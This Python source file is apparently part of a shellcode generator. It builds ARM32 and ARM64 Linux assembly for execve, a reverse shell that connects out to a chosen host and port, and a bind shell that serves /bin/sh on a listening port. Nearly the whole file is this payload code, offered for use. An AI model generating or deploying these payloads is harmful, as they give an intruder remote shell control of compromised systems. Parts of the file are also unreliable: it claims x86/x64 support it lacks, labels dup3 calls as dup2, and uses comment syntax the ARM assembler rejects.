"""
Linux Code Generator

Handles generation of Linux shellgen with:
- Syscall-based execution (execve, socket, dup2, etc.)
- Bad character encoding for immediate values
- Support for x86, x64, ARM32, and ARM64 architectures
"""

from ..encoders import encode_dword, encode_qword, string_to_push_dwords


class LinuxGenerator:
    """Generator for Linux shellgen (x86, x64, ARM32, ARM64)"""

    def __init__(self, bad_chars, arch="x86"):
        """
        Initialize the generator.

        Args:
            bad_chars: Set of bad character bytes to avoid
            arch: Target architecture ('x86', 'x64', 'arm', 'arm64')
        """
        self.bad_chars = set(bad_chars)
        self.arch = arch.lower()

        # Validate architecture
        if self.arch not in ['x86', 'x64', 'arm', 'arm64']:
            raise ValueError(f"Unsupported Linux architecture: {self.arch}")

    def gen_push_encoded_immediate(self, value, reg, comment=""):
        """Generate assembly to load an immediate value, encoding if needed."""
        lines = []

        if self.arch == "arm64":
            # ARM64 uses movz/movk for loading immediates
            result = encode_qword(value, self.bad_chars)
            if result is None:
                # No encoding needed
                lines.append(f"    mov {reg}, #{value}          ; {comment}")
            elif isinstance(result, tuple) and len(result) == 3 and result[0] == "ADD":
                _, val1, val2 = result
                lines.append(f"    ; Encoded via ADD: {value} {comment}")
                lines.append(f"    mov {reg}, #{val1}")
                lines.append(f"    add {reg}, {reg}, #{val2}")
            else:
                clean, offset = result
                lines.append(f"    ; Encoded via SUB: {value} {comment}")
                lines.append(f"    mov {reg}, #{clean}")
                lines.append(f"    sub {reg}, {reg}, #{offset}")
        else:
            # ARM32 uses mov/movw/movt for loading immediates
            result = encode_dword(value, self.bad_chars)
            if result is None:
                lines.append(f"    mov {reg}, #{value}          ; {comment}")
            elif isinstance(result, tuple) and len(result) == 3 and result[0] == "ADD":
                _, val1, val2 = result
                lines.append(f"    ; Encoded via ADD: {value} {comment}")
                lines.append(f"    mov {reg}, #{val1}")
                lines.append(f"    add {reg}, {reg}, #{val2}")
            else:
                clean, offset = result
                lines.append(f"    ; Encoded via SUB: {value} {comment}")
                lines.append(f"    mov {reg}, #{clean}")
                lines.append(f"    sub {reg}, {reg}, #{offset}")

        return "\n".join(lines)

    def gen_execve_arm32(self, command):
        """Generate ARM32 execve shellgen."""
        return f"""; ==========================================================================
; ARM32 Linux execve shellgen
; Command: {command}
; ==========================================================================

.section .text
.global _start
.arm

_start:
    ; execve("{command}", NULL, NULL)
    adr r0, command         ; r0 = pointer to command string
    mov r1, #0              ; r1 = argv (NULL)
    mov r2, #0              ; r2 = envp (NULL)
    mov r7, #11             ; syscall number for execve
    svc #0                  ; invoke syscall

command:
    .asciz "{command}"
"""

    def gen_execve_arm64(self, command):
        """Generate ARM64 execve shellgen."""
        return f"""; ==========================================================================
; ARM64 Linux execve shellgen
; Command: {command}
; ==========================================================================

.section .text
.global _start

_start:
    ; execve("{command}", NULL, NULL)
    adr x0, command         ; x0 = pointer to command string
    mov x1, #0              ; x1 = argv (NULL)
    mov x2, #0              ; x2 = envp (NULL)
    mov x8, #221            ; syscall number for execve (ARM64)
    svc #0                  ; invoke syscall

command:
    .asciz "{command}"
"""

    def gen_reverse_shell_arm32(self, host, port):
        """Generate ARM32 reverse shell shellgen."""
        # Convert IP address to hex
        ip_parts = [int(x) for x in host.split('.')]
        ip_hex = (ip_parts[0] << 24) | (ip_parts[1] << 16) | (ip_parts[2] << 8) | ip_parts[3]
        port_hex = (port >> 8) | ((port & 0xFF) << 8)  # Network byte order

        return f"""; ==========================================================================
; ARM32 Linux Reverse Shell
; Target: {host}:{port}
; ==========================================================================

.section .text
.global _start
.arm

_start:
    ; socket(AF_INET, SOCK_STREAM, 0)
    mov r0, #2              ; AF_INET
    mov r1, #1              ; SOCK_STREAM
    mov r2, #0              ; protocol
    mov r7, #281            ; sys_socket
    svc #0
    mov r6, r0              ; save socket fd in r6

    ; connect(sockfd, &sockaddr, sizeof(sockaddr))
    adr r1, sockaddr        ; pointer to sockaddr_in
    mov r2, #16             ; sizeof(sockaddr_in)
    mov r7, #283            ; sys_connect
    svc #0

    ; dup2(sockfd, 0)
    mov r0, r6
    mov r1, #0
    mov r7, #63             ; sys_dup2
    svc #0

    ; dup2(sockfd, 1)
    mov r0, r6
    mov r1, #1
    mov r7, #63
    svc #0

    ; dup2(sockfd, 2)
    mov r0, r6
    mov r1, #2
    mov r7, #63
    svc #0

    ; execve("/bin/sh", NULL, NULL)
    adr r0, binsh
    mov r1, #0
    mov r2, #0
    mov r7, #11             ; sys_execve
    svc #0

sockaddr:
    .short 2                ; AF_INET
    .short 0x{port_hex:04x}        ; port in network byte order
    .word 0x{ip_hex:08x}           ; IP address
    .word 0, 0              ; padding

binsh:
    .asciz "/bin/sh"
"""

    def gen_reverse_shell_arm64(self, host, port):
        """Generate ARM64 reverse shell shellgen."""
        # Convert IP address to hex
        ip_parts = [int(x) for x in host.split('.')]
        ip_hex = (ip_parts[0] << 24) | (ip_parts[1] << 16) | (ip_parts[2] << 8) | ip_parts[3]
        port_hex = (port >> 8) | ((port & 0xFF) << 8)  # Network byte order

        return f"""; ==========================================================================
; ARM64 Linux Reverse Shell
; Target: {host}:{port}
; ==========================================================================

.section .text
.global _start

_start:
    ; socket(AF_INET, SOCK_STREAM, 0)
    mov x0, #2              ; AF_INET
    mov x1, #1              ; SOCK_STREAM
    mov x2, #0              ; protocol
    mov x8, #198            ; sys_socket (ARM64)
    svc #0
    mov x19, x0             ; save socket fd in x19

    ; connect(sockfd, &sockaddr, sizeof(sockaddr))
    mov x0, x19             ; socket fd
    adr x1, sockaddr        ; pointer to sockaddr_in
    mov x2, #16             ; sizeof(sockaddr_in)
    mov x8, #203            ; sys_connect (ARM64)
    svc #0

    ; dup2(sockfd, 0)
    mov x0, x19
    mov x1, #0
    mov x8, #24             ; sys_dup3 (ARM64)
    svc #0

    ; dup2(sockfd, 1)
    mov x0, x19
    mov x1, #1
    mov x8, #24
    svc #0

    ; dup2(sockfd, 2)
    mov x0, x19
    mov x1, #2
    mov x8, #24
    svc #0

    ; execve("/bin/sh", NULL, NULL)
    adr x0, binsh
    mov x1, #0
    mov x2, #0
    mov x8, #221            ; sys_execve (ARM64)
    svc #0

sockaddr:
    .short 2                ; AF_INET
    .short 0x{port_hex:04x}        ; port in network byte order
    .word 0x{ip_hex:08x}           ; IP address
    .word 0, 0              ; padding

binsh:
    .asciz "/bin/sh"
"""

    def gen_bind_shell_arm32(self, port, shell="/bin/sh"):
        """Generate ARM32 bind shell shellgen."""
        # Convert port to network byte order
        port_high = (port >> 8) & 0xFF
        port_low = port & 0xFF

        return f"""; ==========================================================================
; ARM32 Linux bind shell
; Port: {port}
; Shell: {shell}
; ==========================================================================

.section .text
.global _start
.arm

_start:
    ; socket(AF_INET, SOCK_STREAM, 0)
    mov r0, #2              ; AF_INET
    mov r1, #1              ; SOCK_STREAM
    mov r2, #0              ; protocol = 0
    mov r7, #281            ; __NR_socket
    svc #0                  ; invoke syscall
    mov r4, r0              ; save socket fd in r4

    ; bind(sockfd, &sockaddr, 16)
    adr r1, sockaddr        ; r1 = pointer to sockaddr
    mov r2, #16             ; sizeof(sockaddr_in)
    mov r7, #282            ; __NR_bind
    svc #0                  ; invoke syscall

    ; listen(sockfd, 0)
    mov r0, r4              ; sockfd
    mov r1, #0              ; backlog = 0
    mov r7, #284            ; __NR_listen
    svc #0                  ; invoke syscall

    ; accept(sockfd, NULL, NULL)
    mov r0, r4              ; sockfd
    mov r1, #0              ; addr = NULL
    mov r2, #0              ; addrlen = NULL
    mov r7, #285            ; __NR_accept (or 366 for accept4)
    svc #0                  ; invoke syscall
    mov r4, r0              ; save accepted socket in r4

    ; dup2(newsockfd, 0) - stdin
    mov r0, r4              ; newsockfd
    mov r1, #0              ; stdin
    mov r7, #63             ; __NR_dup2
    svc #0

    ; dup2(newsockfd, 1) - stdout
    mov r0, r4              ; newsockfd
    mov r1, #1              ; stdout
    mov r7, #63             ; __NR_dup2
    svc #0

    ; dup2(newsockfd, 2) - stderr
    mov r0, r4              ; newsockfd
    mov r1, #2              ; stderr
    mov r7, #63             ; __NR_dup2
    svc #0

    ; execve("{shell}", NULL, NULL)
    adr r0, shell           ; r0 = pointer to shell string
    mov r1, #0              ; argv = NULL
    mov r2, #0              ; envp = NULL
    mov r7, #11             ; __NR_execve
    svc #0                  ; invoke syscall

sockaddr:
    .short 2                ; sin_family = AF_INET
    .byte {port_high}, {port_low}  ; sin_port (network byte order)
    .byte 0, 0, 0, 0        ; sin_addr = 0.0.0.0 (INADDR_ANY)
    .byte 0, 0, 0, 0        ; padding
    .byte 0, 0, 0, 0        ; padding

shell:
    .asciz "{shell}"
"""

    def gen_bind_shell_arm64(self, port, shell="/bin/sh"):
        """Generate ARM64 bind shell shellgen."""
        # Convert port to network byte order
        port_high = (port >> 8) & 0xFF
        port_low = port & 0xFF

        return f"""; ==========================================================================
; ARM64 Linux bind shell
; Port: {port}
; Shell: {shell}
; ==========================================================================

.section .text
.global _start

_start:
    ; socket(AF_INET, SOCK_STREAM, 0)
    mov x0, #2              ; AF_INET
    mov x1, #1              ; SOCK_STREAM
    mov x2, #0              ; protocol = 0
    mov x8, #198            ; __NR_socket
    svc #0                  ; invoke syscall
    mov x19, x0             ; save socket fd in x19

    ; bind(sockfd, &sockaddr, 16)
    mov x0, x19             ; sockfd
    adr x1, sockaddr        ; x1 = pointer to sockaddr
    mov x2, #16             ; sizeof(sockaddr_in)
    mov x8, #200            ; __NR_bind
    svc #0                  ; invoke syscall

    ; listen(sockfd, 0)
    mov x0, x19             ; sockfd
    mov x1, #0              ; backlog = 0
    mov x8, #201            ; __NR_listen
    svc #0                  ; invoke syscall

    ; accept(sockfd, NULL, NULL)
    mov x0, x19             ; sockfd
    mov x1, #0              ; addr = NULL
    mov x2, #0              ; addrlen = NULL
    mov x8, #202            ; __NR_accept
    svc #0                  ; invoke syscall
    mov x19, x0             ; save accepted socket in x19

    ; dup2(newsockfd, 0) - stdin
    mov x0, x19             ; newsockfd
    mov x1, #0              ; stdin
    mov x8, #24             ; __NR_dup3 (or use #23 for dup2)
    svc #0

    ; dup2(newsockfd, 1) - stdout
    mov x0, x19             ; newsockfd
    mov x1, #1              ; stdout
    mov x8, #24             ; __NR_dup3
    svc #0

    ; dup2(newsockfd, 2) - stderr
    mov x0, x19             ; newsockfd
    mov x1, #2              ; stderr
    mov x8, #24             ; __NR_dup3
    svc #0

    ; execve("{shell}", NULL, NULL)
    adr x0, shell           ; x0 = pointer to shell string
    mov x1, #0              ; argv = NULL
    mov x2, #0              ; envp = NULL
    mov x8, #221            ; __NR_execve
    svc #0                  ; invoke syscall

sockaddr:
    .short 2                ; sin_family = AF_INET
    .byte {port_high}, {port_low}  ; sin_port (network byte order)
    .byte 0, 0, 0, 0        ; sin_addr = 0.0.0.0 (INADDR_ANY)
    .byte 0, 0, 0, 0        ; padding
    .byte 0, 0, 0, 0        ; padding

shell:
    .asciz "{shell}"
"""

    def generate(self, config):
        """
        Generate Linux shellgen based on configuration.

        Args:
            config: Dict with keys:
                - 'payload': 'execve', 'reverse_shell', or 'bind_shell'
                - 'command': Command string for execve
                - 'host': IP address for reverse shell
                - 'port': Port number for reverse/bind shell
                - 'shell': Shell to execute for shells

        Returns:
            str: Complete assembly code
        """
        payload_type = config.get("payload", "execve")

        output = []
        output.append("; " + "=" * 70)
        output.append(f"; Auto-generated {self.arch.upper()} Linux Shellcode")
        output.append(f"; Payload: {payload_type}")
        output.append(f"; Bad chars: {{{', '.join(f'0x{b:02x}' for b in sorted(self.bad_chars))}}}")
        output.append("; " + "=" * 70)
        output.append("")

        if payload_type == "execve":
            command = config.get("command", "/bin/sh")
            if self.arch == "arm64":
                output.append(self.gen_execve_arm64(command))
            else:
                output.append(self.gen_execve_arm32(command))

        elif payload_type == "reverse_shell":
            host = config.get("host", "127.0.0.1")
            port = config.get("port", 4444)
            if self.arch == "arm64":
                output.append(self.gen_reverse_shell_arm64(host, port))
            else:
                output.append(self.gen_reverse_shell_arm32(host, port))

        elif payload_type == "bind_shell":
            port = config.get("port", 4444)
            shell = config.get("shell", "/bin/sh")
            if self.arch == "arm64":
                output.append(self.gen_bind_shell_arm64(port, shell))
            else:
                output.append(self.gen_bind_shell_arm32(port, shell))

        else:
            raise ValueError(f"Unknown payload type: {payload_type}")

        full_asm = "\n".join(output)

        # Print summary
        print("=" * 72)
        print("SHELLCODE GENERATOR OUTPUT")
        print("=" * 72)
        print(f"Architecture:   {self.arch.upper()}")
        print(f"Payload:        {payload_type}")
        if payload_type == "execve":
            print(f"Command:        {config.get('command', '/bin/sh')}")
        elif payload_type == "reverse_shell":
            print(f"Target:         {config.get('host', '127.0.0.1')}:{config.get('port', 4444)}")
        elif payload_type == "bind_shell":
            print(f"Listen Port:    {config.get('port', 4444)}")
            print(f"Shell:          {config.get('shell', '/bin/sh')}")
        print(f"Bad characters: {{{', '.join(f'0x{b:02x}' for b in sorted(self.bad_chars))}}}")
        print("=" * 72)
        print()

        return full_asm
